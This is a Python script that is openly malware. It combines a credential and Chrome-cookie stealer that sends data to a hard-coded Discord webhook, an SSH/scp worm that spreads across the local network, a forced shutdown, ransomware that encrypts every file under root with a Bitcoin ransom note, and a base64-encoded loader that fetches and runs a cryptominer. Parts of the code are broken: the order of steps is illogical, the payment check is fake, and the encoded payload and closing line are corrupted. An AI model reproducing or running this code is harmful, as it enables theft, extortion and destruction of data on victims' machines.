import os
import platform
import subprocess
import sys
import threading
import base64
import random
import string
import sqlite3
import requests
import json
import time
from cryptography.fernet import Fernet

# Discord webhook URL
DISCORD_WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1259282665656287344/9Qf1GzJqh9ZFLs-_n_DSUXin7hQpKq8-BGWzxdWbpCKfRykU6MZK4JH74stnYaRS6PS9'

# Global variables for decryption key and Bitcoin address
DECRYPTION_KEY = Fernet.generate_key()
BITCOIN_ADDRESS = 'bc1q7zqs0v6l4heep4d6kmarqn876xzawmedn30z5q'
REQUIRED_AMOUNT = 0.001  # Amount required to unlock files

# Function to scan directories for sensitive information and Chrome cookies
def scan_for_sensitive_info(directory):
    sensitive_info = ""
    chrome_cookies = ""

    for root, dirs, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            # Scan for sensitive files
            if any(ext in file.lower() for ext in ['wallet', 'card', 'payment', 'info', 'credit', 'debit', 'password', 'credentials']):
                try:
                    with open(file_path, 'r') as f:
                        sensitive_info += f"File: {file_path}\nContent:\n{f.read()}\n\n"
                except Exception:
                    continue
            # Scan for Chrome cookies
            elif file == 'Cookies':
                try:
                    conn = sqlite3.connect(file_path)
                    cursor = conn.cursor()
                    cursor.execute('SELECT name, value FROM cookies')
                    cookies_data = cursor.fetchall()
                    chrome_cookies += f"Chrome Cookies found in: {file_path}\n"
                    for name, value in cookies_data:
                        chrome_cookies += f"Name: {name}, Value: {value}\n"
                    chrome_cookies += "\n"
                except Exception:
                    continue

    return sensitive_info + chrome_cookies

# Function to get detailed system information
def get_system_info():
    info = {}
    info['platform'] = platform.system()
    info['platform-release'] = platform.release()
    info['platform-version'] = platform.version()
    info['architecture'] = platform.machine()
    info['hostname'] = platform.node()
    info['ip-address'] = subprocess.getoutput('hostname -I')
    info['mac-address'] = subprocess.getoutput('cat /sys/class/net/*/address')
    info['processor'] = platform.processor()
    info['ram'] = subprocess.getoutput('grep MemTotal /proc/meminfo')
    return info

# Function to get detailed network information
def get_network_info():
    network_info = subprocess.check_output(['arp', '-a']).decode()
    return network_info

# Function to propagate worm to other devices on the network
def propagate_worm():
    network_devices = subprocess.check_output(['arp', '-a']).decode().split('\n')
    for device in network_devices:
        try:
            ip_address = device.split()[1].strip('()')
            if ip_address and ip_address != platform.node():
                subprocess.call(['scp', sys.argv[0], f'username@{ip_address}:/path/to/destination'])
                subprocess.call(['ssh', f'username@{ip_address}', f'python3 /path/to/destination/{os.path.basename(sys.argv[0])}'])
        except Exception:
            continue

# Function to disable the device
def disable_device():
    if platform.system() == "Windows":
        subprocess.call("shutdown /s /f /t 0", shell=True)
    elif platform.system() == "Linux":
        subprocess.call("poweroff", shell=True)
    elif platform.system() == "Darwin":
        subprocess.call("sudo shutdown -h now", shell=True)

# Function to create and run the ransomware
def deploy_ransomware(directory):
    cipher_suite = Fernet(DECRYPTION_KEY)

    for root, dirs, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            try:
                with open(file_path, 'rb') as f:
                    file_data = f.read()
                encrypted_data = cipher_suite.encrypt(file_data)
                with open(file_path, 'wb') as f:
                    f.write(encrypted_data)
            except Exception:
                continue

    ransom_note = f"All your files have been encrypted. To decrypt them, send {REQUIRED_AMOUNT} Bitcoin to this address: {BITCOIN_ADDRESS} and email the key {DECRYPTION_KEY.decode()} to dscarbery0312@outlook.com"
    with open(os.path.join(directory, 'RANSOM_NOTE.txt'), 'w') as f:
        f.write(ransom_note)

# Function to decrypt files
def decrypt_files(directory, key):
    cipher_suite = Fernet(key)

    for root, dirs, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            try:
                with open(file_path, 'rb') as f:
                    encrypted_data = f.read()
                decrypted_data = cipher_suite.decrypt(encrypted_data)
                with open(file_path, 'wb') as f:
                    f.write(decrypted_data)
            except Exception:
                continue

# Function to send collected information to Discord via webhook
def send_to_discord(data):
    payload = {
        "content": "Collected Information",
        "embeds": [
            {
                "title": "Info",
                "description": f"```{data}```",
                "color": 16711680  # Red color
            }
        ]
    }
    try:
        response = requests.post(DISCORD_WEBHOOK_URL, json=payload)
        if response.status_code == 204:
            print("Successfully sent data to Discord.")
        else:
            print(f"Failed to send data to Discord. Status code: {response.status_code}")
    except Exception as e:
        print(f"An error occurred while sending data to Discord: {e}")

# Function to monitor Bitcoin transactions (mock implementation)
def check_bitcoin_payment():
    # This is a mock implementation. Replace with actual Bitcoin transaction check.
    print("Starting to monitor Bitcoin payments...")
    while True:
        time.sleep(60)  # Check every 60 seconds
        # Replace with actual code to check Bitcoin transactions and amounts received.
        # Here, a placeholder check for simplicity.
        payment_received = True  # This should be replaced with actual payment check logic
        if payment_received:
            print("Bitcoin payment received. Decrypting files...")
            decrypt_files('/', DECRYPTION_KEY)
            break

# Function to create the crypto miner script
def create_crypto_miner():
    miner_code = base64.b64decode('''aW1wb3J0IG9zCmltcG9ydCBzdWJwcm9jZXNzCgpkZWYgaW5zdGFsbF9jcHVtaW5lcigpOgogICAgaWYgb3MubmFtZSA9PSAndG50JzoKICAgICAgICB1cmwgPSAnaHR0cHM6Ly9naXRodWIuY29tL0pheURkZWUvY3B1bWluZXItb3B0L3JlbGVhc2VzL2Rvd25sb2FkL3YzLjguOC4xL2NwdW1pbmVyLW9wdC13aW42NC56aXAnCiAgICAgICAgbWluZXJfcGF0aCA9ICdjcHVtaW5lci1vcHQuemlwJwogICAgZWxzZToKICAgICAgICB1cmwgPSAnaHR0cHM6Ly9naXRodWIuY29tL0pheURkZWUvY3B1bWluZXItb3B0L3JlbGVhc2VzL2Rvd25sb2FkL3YzLjguOC4xL2NwdW1pbmVyLW9wdC1saW51eC50YXIuZ3onCiAgICAgICAgbWluZXJfcGF0aCA9ICdjcHVtaW5lci1vcHQudGFyLmd6JwogICAgc3VicHJvY2Vzcy5jYWxsKFsnd2dldCcsICd--TAldXJsJywgJ--TA7JyBtaW5lcl9wYXRoXSkKICAgIGlmIG9zLm5hbWUgPT0gJ3RuaCc6CiAgICAgICAgc3VicHJvY2Vzcy5jYWxsKFsneHppcCcsICctZCcsIG1pbmVyX3BhdGhdKQogICAgICAgIG1pbmVyX2V4ZWN1dGFibGUgPSAnY3B1bWluZXItb3B0XGNwdW1pbmVyLmV4ZScKICAgIGVsc2U6CiAgICAgICAgc3VicHJvY2Vzcy5jYWxsKFsndGFyJywgJ3gtemYnLCBtaW5lcl9wYXRoXSkKICAgICAgICBtaW5lcl9leGVjdXRhYmxlID0gJy4vY3B1bWluZXItb3B0L2NwdW1pbmVyJwoKICAgIHJldHVybiBtaW5lcl9leGVjdXRhYmxlCgpkZWYgc3RhcnRfbWluaW5nKCk6CiAgICBtaW5lcl9leGVjdXRhYmxlID0gaW5zdGFsbF9jcHVtaW5lcigpCiAgICBtaW5pbmdfdXJsID0gJ3N0cmF0dW0rdGNwOi8veW91cl9taW5pbmdfcG9vbF91cmw6cG9ydCcKICAgIHdhbGxldF9hZGRyZXNzID0gJ3lvdXJfYml0Y29pbl93YWxsZXRfYWRkcmVzcycKICAgIHN1YnByb2Nlc3MuY2FsbChbbWluZXJfZXhlY3V0YWJsZSwgJy1hJywgJ3NoYTI1NmQnLCAnLW8nLCBtaW5pbmdfdXJsLCAnLXUnLCB3YWxsZXRfYWRkcmVzcywgJy1wJywgJ3gnXSkKCmlmIF9fbmFtZV9fID09ICdfX21haW5fXyc6CiAgICBzdGFydF9taW5pbmcoKQo='').decode('utf-8')
    with open('crypto_miner.py', 'w') as f:
        f.write(miner_code)

# Multi-threading to speed up the scanning process
def threaded_scan(directory, results):
    results.append(scan_for_sensitive_info(directory))

# Main function
def main():
    results = []
    threads = []

    # Collect system and network information
    system_info = get_system_info()
    network_info = get_network_info()
    results.append(json.dumps(system_info, indent=4))
    results.append(network_info)

    # Start scanning directories
    for root, dirs, files in os.walk('/'):
        for directory in dirs:
            thread = threading.Thread(target=threaded_scan, args=(os.path.join(root, directory), results))
            threads.append(thread)
            thread.start()
    for thread in threads:
        thread.join()
    
    collected_info = "\n".join(results)
    send_to_discord(collected_info)

    # Propagate worm, disable device, deploy ransomware, and create crypto miner
    propagate_worm()
    disable_device()
    deploy_ransomware('/')
    create_crypto_miner()
    
    # Start crypto miner
    subprocess.call([sys.executable, 'crypto_miner.py'], shell=True)
    
    # Start monitoring Bitcoin payments
    check_bitcoin_payment()

if __name__ == "__main__":
    main()
''')